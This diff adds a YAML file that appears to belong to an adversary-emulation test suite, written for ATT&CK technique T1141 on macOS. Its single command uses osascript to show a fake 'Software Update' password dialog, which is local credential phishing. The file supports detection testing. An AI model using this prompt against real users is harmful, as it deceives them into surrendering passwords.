@@ -1,0 +1,18 @@
+---
+attack_technique: T1141
+display_name: Input Prompt
+
+atomic_tests:
+- name: Prompt User for Password
+  description: |
+    Prompt User for Password (Local Phishing)
+    Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html
+
+  supported_platforms:
+    - macos
+
+
+  executor:
+    name: sh
+    command: |
+      osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
